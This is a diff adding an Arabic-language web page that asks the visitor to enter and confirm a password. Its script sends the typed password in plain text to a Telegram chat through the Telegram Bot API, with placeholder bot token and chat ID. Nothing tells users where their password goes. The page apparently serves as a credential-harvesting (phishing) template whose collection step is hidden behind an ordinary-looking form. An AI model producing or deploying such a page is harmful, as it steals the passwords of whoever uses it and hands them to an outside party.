@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إدخال كلمة السر</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 20px;
+            text-align: center;
+        }
+        .container {
+            max-width: 500px;
+            margin: 50px auto;
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            color: #333;
+            margin-bottom: 30px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+            text-align: right;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+        button {
+            background-color: #0088cc;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #006699;
+        }
+        .error {
+            color: red;
+            margin-top: 10px;
+            display: none;
+        }
+        .success {
+            color: green;
+            margin-top: 10px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>إدخال كلمة السر</h1>
+        
+        <div class="form-group">
+            <label for="password1">كلمة السر:</label>
+            <input type="password" id="password1" required>
+        </div>
+        
+        <div class="form-group">
+            <label for="password2">تأكيد كلمة السر:</label>
+            <input type="password" id="password2" required>
+        </div>
+        
+        <button id="submitBtn">إرسال</button>
+        
+        <div id="errorMsg" class="error">كلمتا السر غير متطابقتين!</div>
+        <div id="successMsg" class="success">تم إرسال كلمة السر بنجاح!</div>
+    </div>
+
+    <script>
+        document.getElementById('submitBtn').addEventListener('click', function() {
+            const password1 = document.getElementById('password1').value;
+            const password2 = document.getElementById('password2').value;
+            const errorMsg = document.getElementById('errorMsg');
+            const successMsg = document.getElementById('successMsg');
+            
+            // إخفاء رسائل الخطأ والنجاح
+            errorMsg.style.display = 'none';
+            successMsg.style.display = 'none';
+            
+            // التحقق من تطابق كلمتي السر
+            if (password1 !== password2) {
+                errorMsg.style.display = 'block';
+                return;
+            }
+            
+            // التحقق من أن كلمة السر ليست فارغة
+            if (password1 === '' || password2 === '') {
+                errorMsg.textContent = 'يجب إدخال كلمة السر في الحقلين!';
+                errorMsg.style.display = 'block';
+                return;
+            }
+            
+            // إرسال البيانات إلى بوت تيليجرام
+            sendToTelegramBot(password1);
+        });
+        
+        function sendToTelegramBot(password) {
+            // استبدل هذه القيم بمعلومات بوتك
+            const botToken = 'YOUR_BOT_TOKEN';
+            const chatId = 'YOUR_CHAT_ID';
+            
+            // نص الرسالة
+            const message = `تم إدخال كلمة سر جديدة:\n${password}`;
+            
+            // رابط API تيليجرام
+            const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            
+            // إرسال البيانات باستخدام fetch
+            fetch(apiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    document.getElementById('successMsg').style.display = 'block';
+                    // مسح الحقول بعد الإرسال الناجح
+                    document.getElementById('password1').value = '';
+                    document.getElementById('password2').value = '';
+                } else {
+                    document.getElementById('errorMsg').textContent = 'حدث خطأ أثناء الإرسال!';
+                    document.getElementById('errorMsg').style.display = 'block';
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                document.getElementById('errorMsg').textContent = 'حدث خطأ أثناء الإرسال!';
+                document.getElementById('errorMsg').style.display = 'block';
+            });
+        }
+    </script>
+</body>
+</html>
